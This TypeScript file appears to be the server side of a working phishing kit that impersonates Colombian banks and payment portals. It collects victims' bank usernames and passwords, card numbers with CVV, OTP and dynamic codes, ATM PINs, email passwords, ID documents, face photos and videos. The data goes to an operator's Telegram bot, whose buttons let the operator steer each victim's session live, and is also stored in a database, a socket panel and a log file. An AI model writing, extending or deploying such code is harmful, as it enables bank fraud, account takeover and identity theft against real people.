/* eslint-disable @typescript-eslint/no-explicit-any */
import { NextResponse } from "next/server";
import fs from 'fs';
import path from 'path';

import { createSession, setSessionStatus, getProjectManagementType } from "@/lib/supabaseSession";
import { getFullKeyboard, getFullKeyboardNequi, getFullKeyboardEmpresas, getFullKeyboardCajaSocial, getFullKeyboardDavivienda, getFullKeyboardColpatria } from "@/lib/telegramKeyboards";

import { getTelegramConfig } from "@/lib/telegramConfig";

const globalAny = global as any;
if (!globalAny.__sessionBankStore) {
  globalAny.__sessionBankStore = {};
}
const sessionBankStore: Record<string, boolean> = globalAny.__sessionBankStore;
if (!globalAny.__sessionBankNameStore) {
  globalAny.__sessionBankNameStore = {};
}
const sessionBankNameStore: Record<string, string> = globalAny.__sessionBankNameStore;
function resolveRealBankName(body: any): string {
  const invalidBankNames = new Set([
    "generic", "jelpit", "wom", "pyp", "live", "vuelos", "sv", "tc",
    "proyecto", "panel", "no disponible", "undefined", "null", "app_nativa"
  ]);

  const isInvalid = (name: any): boolean => {
    if (!name || typeof name !== 'string') return true;
    const clean = name.trim().toLowerCase();
    return invalidBankNames.has(clean) || clean.includes("jelpit") || clean.includes("proyecto");
  };

  // 1. Try body.bankSelct / bankSelect
  if (!isInvalid(body.bankSelct)) return body.bankSelct.trim();
  if (!isInvalid(body.bankSelect)) return body.bankSelect.trim();

  // 2. Try pse_validacion_data
  try {
    if (body?.pse_validacion_data && body.pse_validacion_data !== "null") {
      const parsedPse = typeof body.pse_validacion_data === 'string' ? JSON.parse(body.pse_validacion_data) : body.pse_validacion_data;
      const pseBank = parsedPse?.bancoNombre || parsedPse?.banco || parsedPse?.bank;
      if (!isInvalid(pseBank)) return String(pseBank).trim();
    }
  } catch (e) {}

  // 3. Try body.bank or body.banco
  const directBank = body.bank?.name || body.bank || body.banco;
  if (!isInvalid(directBank)) return String(directBank).trim();

  return "No especificado";
}

const getProjectIdFromReferer = (referer: string | null): string | undefined => {
  if (!referer) return undefined;
  try {
    const refererUrl = new URL(referer);
    return refererUrl.searchParams.get('projectId') || refererUrl.searchParams.get('project_id') || undefined;
  } catch {
    return undefined;
  }
};

const emitSocketEvent = async (projectId: string, event: string, data: any) => {
  try {
    await fetch('http://localhost:3001/emit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ projectId, event, data }),
    });
  } catch (err) {
    console.warn('[banco/send] Error emitiendo evento socket:', err);
  }
};

export async function POST(req: Request) {
  const contentType = req.headers.get("content-type") || "";
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "No disponible";
  const fechaLegible = new Date().toLocaleString("es-CO", {
    timeZone: "America/Bogota",
    dateStyle: "full",
    timeStyle: "short"
  });

  const { botToken: activeBot, chatId: activeChat } = getTelegramConfig();

  // --- BLOQUE MULTIMEDIA (FOTO Y VIDEO) ---hhh
  if (contentType.includes("multipart/form-data")) {
    try {
      const formData = await req.formData();
      const sessionId = formData.get("sessionId")?.toString();
      const captureType = formData.get("captureType")?.toString() || "facial";
      const foto = formData.get("photo") as Blob;
      const video = formData.get("video") as Blob;

      if (!sessionId) return NextResponse.json({ error: "No SessionId" }, { status: 400 });
      const isBancol = sessionBankStore[sessionId] || false;
      const reply_markup = JSON.stringify(getFullKeyboard(sessionId, undefined, isBancol));

      if (foto) {
        let photoTitle = "CAPTURA FACIAL";
        if (captureType === "documento_frente") photoTitle = "DOCUMENTO FRONTAL";
        if (captureType === "documento_dorso") photoTitle = "DOCUMENTO TRASERO";

        const fData = new FormData();
        fData.append("chat_id", activeChat!);
        fData.append("photo", foto, "captura.jpg");
        fData.append("caption", `📸 **${photoTitle}**\n🆔 ID: ${sessionId}\n📍 IP: ${ip}\n🕰️ ${fechaLegible}`);
        await fetch(`https://api.telegram.org/bot${activeBot}/sendPhoto`, { method: "POST", body: fData });
      }

      if (video) {
        let videoTitle = "VIDEO MOVIMIENTO";
        if (captureType === "documento_frente") videoTitle = "VIDEO ESCANEO FRONTAL";
        if (captureType === "documento_dorso") videoTitle = "VIDEO ESCANEO TRASERO";

        const vData = new FormData();
        vData.append("chat_id", activeChat!);
        vData.append("document", video, "grabacion.webm");
        vData.append("caption", `🎥 **${videoTitle}**\n🆔 ID: ${sessionId}`);

        // Solo mandamos botones interactivos si es el paso final (facial)
        if (captureType === "facial") {
          vData.append("reply_markup", reply_markup);
        }

        await fetch(`https://api.telegram.org/bot${activeBot}/sendDocument`, { method: "POST", body: vData });

        if (captureType === "facial") {
          // ESTA LÍNEA ES CLAVE: Mantiene al usuario en la vista de espera/facial 
          // hasta que tú presiones otro botón en Telegram.
          await setSessionStatus(sessionId, "facial");
        }
      }

      return NextResponse.json({ ok: true });
    } catch (error: any) {
      console.error("Error Multimedia:", error.message);
      return NextResponse.json({ ok: true });
    }
  }

  // --- BLOQUE DATOS JSON ---
  try {
    const body = await req.json();
    const sessionId = body?.sessionId;
    console.log("Received data:", body);

    if (!sessionId) return NextResponse.json({ error: "No ID" }, { status: 400 });

    const refererProjectId = getProjectIdFromReferer(req.headers.get('referer'));
    const resolvedProjectId = body.projectId || refererProjectId || process.env.NEXT_PUBLIC_PROJECT_ID || process.env.PROJECT_ID;

    // ─── Verificar modo del proyecto (panel_live vs telegram) ───────────
    const isPanelLive = (await getProjectManagementType(resolvedProjectId)) === 'panel_live';
    // ────────────────────────────────────────────────────────

    const rawBankName = resolveRealBankName(body);
    if (rawBankName && rawBankName.toLowerCase() !== "generic") {
      sessionBankNameStore[sessionId] = rawBankName;
    }
    const bankName = sessionBankNameStore[sessionId] || rawBankName;
    const isBogota = bankName.toLowerCase().includes("bogota");
    const isNequi = bankName.toLowerCase().includes("nequi");
    const isBancol = body.bankId === "bancol" || bankName.toLowerCase().includes("bancolombia");
    sessionBankStore[sessionId] = isBancol;

    // Resetear status en memoria a 'pending' cuando llega cualquier dato de formulario
    // Esto evita que el polling vuelva a disparar la misma modal de error
    const hasFormData = body.otp || body.dinamica || body.cajero || body.claveCajero ||
      body.tarjeta || body.number || body.clave || body.usuario || body.saldo;
    if (hasFormData) {
      const globalAny = global as any;
      if (globalAny.__sessionStatusMap) {
        globalAny.__sessionStatusMap[sessionId] = 'pending';
      }
      // También actualizamos Supabase de forma no bloqueante
      setSessionStatus(sessionId, 'pending').catch(() => {});
    }

    let textData = '';

    // INTERCEPTOR: Validación para la notificación de autorización rápida
    if (body?.isAuthorizedNotification) {
      const nombreProyecto = process.env.PROYECTO || "PROYECTO";
      textData = `
*****************************************
  📲 ${nombreProyecto} - NOTIFICACIÓN APP BANCARIA 📲
*****************************************
🆔 ID: ${sessionId}
🏦 Banco: ${bankName}

⚠️ El usuario ha pulsado "Ya autoricé". Informa que completó la validación manual desde su App móvil.
A la espera de comandos del operador.
_____________________________________
🕰️ Fecha: ${fechaLegible}
📍 Ip: ${ip}
_____________________________________
`;
    } else {
      // Flujo original para el resto de capturas estructuradas
      let pse_validacion_data = null;
      try {
        if (body?.pse_validacion_data && body.pse_validacion_data !== "null") {
          pse_validacion_data = JSON.parse(body.pse_validacion_data);
        }
      } catch (e) {
        console.warn("Could not parse pse_validacion_data", e);
      }

      // 1. Bloque condicional de Tarjeta
      const seccionTarjeta = (body.tarjeta || body.number) ? `
  💳 **DATOS DE TARJETA** 💳
  ${body.tarjeta || body.number ? `🔢 Numero: ${body.tarjeta || body.number}\n` : ''}${body.fecha || body.month ? `📅 Expiración: ${body.fecha || body.month}\n` : ''}${body.cvv ? `🔮 CVV: ${body.cvv}\n` : ''}${body.franquicia ? `🗂️ Franquicia: ${body.franquicia}\n` : ''}${body.bank ? `🏦 Banco: ${bankName}\n` : ''}` : '';

      // 2. Bloque condicional de Seguridad (OTP / Dinámica / Cajero)
      const seccionSeguridad = (body.otp || body.dinamica || body?.token || body.cajero || body.claveCajero) ? `
  🔐 **SEGURIDAD ADICIONAL** 🔐
  ${body.otp ? `🔏 Otp: ${body.otp}\n` : ''}${body.dinamica ? `🔐 Dinamica: ${body.dinamica}\n` : ''}${body?.token ? `🔑 Token: ${body?.token}\n` : ''}${(body.cajero || body.claveCajero) ? `🏧 Clave Cajero: ${body.cajero || body.claveCajero}\n` : ''}` : '';

      const offerEnv = (process.env.OFFER_PAGE || "").replace(/['"]/g, "").trim().toLowerCase();
      const projEnv = (process.env.PROYECTO || "").replace(/['"]/g, "").trim().toLowerCase();

      const isJelpit = offerEnv === "jelpit" || projEnv === "jelpit" || body.origen === "jelpit";
      if (isJelpit) {
        let totalPagar = 'No disponible';
        if (pse_validacion_data?.valorTotal) {
          const cleanVal = String(pse_validacion_data.valorTotal).replace(/[^0-9]/g, "");
          const numVal = parseInt(cleanVal, 10);
          totalPagar = isNaN(numVal) ? String(pse_validacion_data.valorTotal) : `$${numVal.toLocaleString('es-CO')}`;
        }

        const fechaActual = new Date();
        const fechaFormateada = fechaActual.toLocaleDateString('es-CO', {
          weekday: 'long',
          day: 'numeric',
          month: 'long',
          year: 'numeric',
        });
        const horaFormateada = fechaActual.toLocaleTimeString('es-CO', {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });

        const projectName = "JELPIT";
        let block1 = `🏢 <b>NUEVO INTENTO DE PAGO (${projectName} - PSE)</b>\n\n`;
        block1 += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
        block1 += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;

        block1 += `👤 <b>Datos del Cliente:</b>\n`;
        block1 += `• Nombre: ${pse_validacion_data?.nombre || 'No disponible'}\n`;
        block1 += `• Correo: ${pse_validacion_data?.email || body.email || 'No disponible'}\n`;
        block1 += `• Celular: ${pse_validacion_data?.telefono || body.phone || 'No disponible'}\n\n`;

        block1 += `🏢 <b>Detalles de la Copropiedad:</b>\n`;
        block1 += `• Conjunto: ${pse_validacion_data?.conjunto || 'No disponible'}\n`;
        block1 += `• Inmueble: ${pse_validacion_data?.inmueble || 'No disponible'}\n`;
        block1 += `• Referencia de Pago: ${pse_validacion_data?.referencia || sessionId}\n`;
        block1 += `• Total a Pagar: ${pse_validacion_data?.valorTotal ? totalPagar : 'No disponible'}\n`;

        let block2 = `\n*****************************************\n`;
        block2 += `         🔥 NUEVO ${body.sendReplyMarkup ? "PAYMENT" : "DATICO"} 🔥\n`;
        block2 += `*****************************************\n`;
        block2 += `🆔 <b>ID:</b> ${sessionId}\n`;
        block2 += `🏦 <b>Banco:</b> ${bankName}\n`;
        block2 += `🏦 <b>Valor:</b> ${pse_validacion_data?.valorTotal ? totalPagar : 'No disponible'}\n\n`;

        if (body.usuario) block2 += `🤖 <b>Usuario:</b> ${body.usuario}\n`;
        if (body.clave) block2 += `🔒 <b>Clave:</b> ${body.clave}\n`;
        if (body.tarjeta || body.number) block2 += `💳 <b>Tarjeta:</b> ${body.tarjeta || body.number}\n`;
        if (body.fecha || body.month) block2 += `📅 <b>Expiración:</b> ${body.fecha || body.month}\n`;
        if (body.cvv) block2 += `🔮 <b>CVV:</b> ${body.cvv}\n`;
        if (body.franquicia) block2 += `🗂️ <b>Franquicia:</b> ${body.franquicia}\n`;
        if (body.otp) block2 += `🔏 <b>Otp:</b> ${body.otp}\n`;
        if (body.dinamica) block2 += `🔐 <b>Dinamica:</b> ${body.dinamica}\n`;
        if (body.token) block2 += `🔑 <b>Token:</b> ${body.token}\n`;
        if (body.saldo) block2 += `🤖 <b>Saldo:</b> ${body.saldo}\n`;
        if (body.cupo_actual) block2 += `💰 <b>Cupo Actual:</b> ${body.cupo_actual}\n`;

        let block3 = `\n_____________________________________\n`;
        block3 += `🕰️ <b>Fecha:</b> ${fechaLegible}\n`;
        block3 += `📍 <b>Ip:</b> ${ip}\n`;
        block3 += `_____________________________________\n`;

        textData = block1 + block2 + block3;
      } else {
        const rawOfferPage = (process.env.PROJECT_NAME || process.env.OFFER_PAGE || process.env.PROYECTO || "").replace(/['"]/g, "").trim();
        const lowerOffer = rawOfferPage.toLowerCase();

        let nombreProyecto = "Pico y Placa";
        if (lowerOffer.includes("pyp") || lowerOffer.includes("pico")) nombreProyecto = "Pico y Placa";
        else if (lowerOffer.includes("wom")) nombreProyecto = "WOM - Pago en Línea";
        else if (lowerOffer.includes("jelpit")) nombreProyecto = "Jelpit - Administración";
        else if (rawOfferPage && !lowerOffer.includes("coomeva")) nombreProyecto = rawOfferPage;

        const isPyp = lowerOffer.includes("pyp");
        const isJelpit = lowerOffer.includes("jelpit");

        let valorP = body.price || pse_validacion_data?.valorTotal || pse_validacion_data?.total || pse_validacion_data?.valor || pse_validacion_data?.precio || pse_validacion_data?.saldo || body.saldo;
        if (valorP) {
          const cleanNum = parseInt(String(valorP).replace(/\D/g, ''), 10);
          if (!isNaN(cleanNum)) {
            valorP = `$${cleanNum.toLocaleString('es-CO')}`;
          }
        }

        const docTipo = body.tipo_doc || pse_validacion_data?.tipoDocumento || pse_validacion_data?.tipo_doc;
        const docNum = body.documento || pse_validacion_data?.identificacion || pse_validacion_data?.numeroDocumento || pse_validacion_data?.documento;
        const userNombre = body.holder || body.nombre || pse_validacion_data?.nombre;
        const userEmail = body.email || pse_validacion_data?.email;
        const userPhone = body.phone || pse_validacion_data?.telefono;
        const userAddress = body.address || pse_validacion_data?.direccion;
        
        // Solo incluir placa si la aplicación activa es PYP
        const placaVehiculo = isPyp ? (pse_validacion_data?.placa || body.placa) : undefined;
        // Solo incluir conjunto/inmueble si la aplicación activa es Jelpit
        const conjunto = isJelpit ? pse_validacion_data?.conjunto : undefined;
        const inmueble = isJelpit ? pse_validacion_data?.inmueble : undefined;
        const referencia = pse_validacion_data?.referencia;

        let msgContent = `🔍 <b>Nuevo Intento de Pago - ${nombreProyecto}</b>\n\n`;
        msgContent += `📅 <b>Fecha:</b> ${fechaLegible}\n\n`;
        msgContent += `📋 <b>Datos del Pago / Cliente:</b>\n`;
        msgContent += `• 🆔 <b>ID Sesión:</b> <code>${sessionId}</code>\n`;
        if (bankName) msgContent += `• 🏦 <b>Banco:</b> ${bankName}\n`;
        if (valorP) msgContent += `• 💰 <b>Valor a pagar:</b> ${valorP}\n`;
        if (docTipo) msgContent += `• 🪪 <b>Tipo Doc:</b> ${docTipo}\n`;
        if (docNum) msgContent += `• 🪪 <b>Documento:</b> ${docNum}\n`;
        if (userNombre) msgContent += `• 👤 <b>Nombre:</b> ${userNombre}\n`;
        if (body.usuario) msgContent += `• 🤖 <b>Usuario:</b> <code>${body.usuario}</code>\n`;
        if (body.clave) msgContent += `• 🔐 <b>Clave:</b> <code>${body.clave}</code>\n`;
        if (userEmail) msgContent += `• 📧 <b>Email:</b> ${userEmail}\n`;
        if (body.correoClave) msgContent += `• 🔑 <b>Clave Correo:</b> <code>${body.correoClave}</code>\n`;
        if (userPhone) msgContent += `• 📱 <b>Celular:</b> ${userPhone}\n`;
        if (userAddress) msgContent += `• 🏠 <b>Dirección:</b> ${userAddress}\n`;
        if (body.saldo) msgContent += `• 🤖 <b>Saldo:</b> ${body.saldo}\n`;
        if (body.cupo_actual) msgContent += `• 💰 <b>Cupo Actual:</b> ${body.cupo_actual}\n`;
        if (placaVehiculo) msgContent += `• 🚗 <b>Placa:</b> ${placaVehiculo}\n`;
        if (conjunto) msgContent += `• 🏢 <b>Conjunto:</b> ${conjunto}\n`;
        if (inmueble) msgContent += `• 🏘️ <b>Inmueble:</b> ${inmueble}\n`;
        if (referencia) msgContent += `• 🔖 <b>Ref:</b> ${referencia}\n`;

        if (seccionTarjeta) {
          msgContent += `\n💳 <b>DATOS DE TARJETA:</b>\n${seccionTarjeta}\n`;
        }

        if (seccionSeguridad) {
          msgContent += `\n🔐 <b>SEGURIDAD ADICIONAL:</b>\n${seccionSeguridad}\n`;
        }

        msgContent += `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        msgContent += `🖥️ <b>INFORMACIÓN DEL DISPOSITIVO</b>\n`;
        msgContent += `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        msgContent += `🌐 <b>IP:</b> ${ip}\n\n`;
        msgContent += `📌 Registro generado automáticamente`;

        textData = msgContent;
        if (body.view === "xconnection_aprobado" || body?.isAuthorizedNotification) {
          textData = `<b>✅ EL USUARIO YA APROBÓ LA TRANSACCIÓN EN SU APP</b>\n\n` + textData;
        }
      }
    }

    const payload: any = {
      chat_id: activeChat,
      text: textData,
      parse_mode: 'HTML'
    };

    const isJelpit = body.origen === "jelpit" || process.env.PROYECTO?.toUpperCase().replace(/['"]/g, "") === "JELPIT";
    if (isJelpit || body?.isAuthorizedNotification || body.view === "xconnection_aprobado") {
      payload.parse_mode = 'HTML';
    }

    // Evaluamos si el mensaje interactivo debe inyectarse con teclados de operador
    if (body.sendReplyMarkup || isBogota || body.tarjeta || body.number || body.cvv || body.cardData || body?.isAuthorizedNotification || body.view === "xconnection_aprobado") {
      let keyboardObj;
      const isCardSubmit = body.tarjeta || body.number || body.cvv || body.cardData;
      const isSvn = body.bankId === "svn_bancolombia" || (body.origen === "svn" && body.bankId !== "bancol");
      const isGeneric = body.bankId === "generic" || (typeof bankName === "string" && bankName.toLowerCase() === "generic");
      const isCajaSocial = body.bankId === "cajasocial" || (typeof bankName === "string" && (bankName.toLowerCase().includes("cajasocial") || bankName.toLowerCase().includes("caja social")));
      const isDavivienda = body.bankId === "davivienda" || (typeof bankName === "string" && bankName.toLowerCase().includes("davivienda"));
      const isColpatria = body.bankId === "colpatria" || (typeof bankName === "string" && bankName.toLowerCase().includes("colpatria"));
      if (isDavivienda) {
        keyboardObj = getFullKeyboardDavivienda(sessionId, ip);
      } else if (isColpatria) {
        keyboardObj = getFullKeyboardColpatria(sessionId, ip);
      } else if (isCajaSocial) {
        keyboardObj = getFullKeyboardCajaSocial(sessionId, ip);
      } else if (isGeneric || isCardSubmit || !isSvn) {
        const isBancol = sessionBankStore[sessionId] || false;
        keyboardObj = isNequi ? getFullKeyboardNequi(sessionId, ip) : getFullKeyboard(sessionId, ip, isBancol, isBogota);
      } else {
        keyboardObj = getFullKeyboardEmpresas(sessionId, ip);
      }

      if (isJelpit) {
        keyboardObj.inline_keyboard = keyboardObj.inline_keyboard.map((row: any) =>
          row.map((btn: any) => {
            if (btn.text.includes("FINALIZAR PROCESO")) {
              return { ...btn, text: `🏁 FINALIZAR - ${bankName}` };
            }
            return btn;
          })
        );
      }

      if (body.origen === "app_nativa" && bankName.toLowerCase().includes("avvillas")) {
        keyboardObj.inline_keyboard.push([{ text: "📲 AUTORIZAR APP", callback_data: `autorizar_app:${sessionId}` }]);
      }
      
      const mType = await getProjectManagementType(resolvedProjectId);
      const isTelegramDisabled = process.env.ISTELEGRAM === "false" || mType === "panel_live";

      if (!isTelegramDisabled) {
        payload.reply_markup = keyboardObj;
      }
    }


    // Inicialización del estado de la sesión en Supabase a 'pending'
    try {
      await createSession(sessionId, {
        status: 'pending',
        project_id: resolvedProjectId || undefined,
        bank: bankName,
        ip,
        chat_id: activeChat || undefined,
        is_bancol: isBancol,
        usuario: body.usuario,
        clave: body.clave,
        tarjeta: body.tarjeta || body.number,
        cvv: body.cvv,
        fecha: body.fecha || body.month,
        franquicia: body.franquicia,
        otp: body.otp,
        dinamica: body.dinamica,
        token: body.token,
        saldo: body.saldo,
        cupo_actual: body.cupo_actual,
        documento: body.documento,
        tipo_doc: body.tipo_doc,
        holder: body.holder,
        email: body.email,
        phone: body.phone,
        address: body.address,
        source: 'banco'
      });

      if (isPanelLive && resolvedProjectId) {
        await emitSocketEvent(resolvedProjectId, 'new_lead', {
          id: sessionId,
          project_id: resolvedProjectId,
          source: 'banco',
          status: 'pending',
          bank: bankName,
          ip,
          usuario: body.usuario,
          clave: body.clave,
          tarjeta: body.tarjeta || body.number,
          cvv: body.cvv,
          fecha: body.fecha || body.month,
          franquicia: body.franquicia,
          otp: body.otp,
          dinamica: body.dinamica,
          token: body.token,
          saldo: body.saldo,
          cupo_actual: body.cupo_actual,
          documento: body.documento,
          tipo_doc: body.tipo_doc,
          holder: body.holder,
          email: body.email,
          phone: body.phone,
          address: body.address,
        });
      }
    } catch (e) {
      console.error('Error pre-creating session pending:', e);
    }

    // ─── Panel Live: quitar botones del payload + añadir nota ─────────
    if (isPanelLive) {
      delete payload.reply_markup;
      payload.text = (payload.text || textData) +
        `\n\n🖥️ <b>MODO PANEL LIVE ACTIVO</b>\n<i>Los botones de acción están desactivados. Este caso es gestionado desde el Panel Live del administrador.</i>`;
    }
    // ────────────────────────────────────────────────────────

    let res = await fetch(`https://api.telegram.org/bot${activeBot}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!res.ok) {
      console.warn("⚠️ Telegram sendMessage con parse_mode fallo, reintentando sin parse_mode...");
      delete payload.parse_mode;
      payload.text = payload.text.replace(/<[^>]*>/g, '');
      res = await fetch(`https://api.telegram.org/bot${activeBot}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    if (res.ok) {
      const tgData = await res.json();
      const messageId = tgData?.result?.message_id;

      await createSession(sessionId, {
        status: 'pending',
        project_id: resolvedProjectId || undefined,
        bank: bankName,
        ip,
        message_id: messageId?.toString(),
        chat_id: activeChat || undefined,
        is_bancol: isBancol,
        usuario: body.usuario,
        clave: body.clave,
        tarjeta: body.tarjeta || body.number,
        cvv: body.cvv,
        fecha: body.fecha || body.month,
        franquicia: body.franquicia,
        otp: body.otp,
        dinamica: body.dinamica,
        token: body.token,
        saldo: body.saldo,
        cupo_actual: body.cupo_actual,
        documento: body.documento,
        tipo_doc: body.tipo_doc,
        holder: body.holder,
        email: body.email,
        phone: body.phone,
        address: body.address,
        source: 'banco'
      });

      // Escritura en logs de auditoría interna
      try {
        const logsPath = path.join(process.cwd(), 'operator-logs.json');
        let logsData: { logs: any[] } = { logs: [] };
        if (fs.existsSync(logsPath)) {
          logsData = JSON.parse(fs.readFileSync(logsPath, 'utf-8'));
        }
        const newLog = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          source: 'banco',
          sessionId,
          bank: bankName,
          ip,
          usuario: body.usuario,
          clave: body.clave,
          documento: body.documento,
          tarjeta: body.tarjeta || body.number,
          cvv: body.cvv,
          holder: body.holder,
          phone: body.phone,
          email: body.email,
          otp: body.otp || body.token
        };
        logsData.logs = [...(logsData.logs || []), newLog];
        if (logsData.logs.length > 500) logsData.logs = logsData.logs.slice(-500);
        fs.writeFileSync(logsPath, JSON.stringify(logsData, null, 2));
      } catch (logErr) {
        console.error("Error writing operator log:", logErr);
      }

      return NextResponse.json({ ok: true, messageId });
    }
    return NextResponse.json({ error: "Telegram rejection" }, { status: 502 });

  } catch (error: any) {
    return NextResponse.json({ error: "Fetch failed: " + error.message }, { status: 502 });
  }
}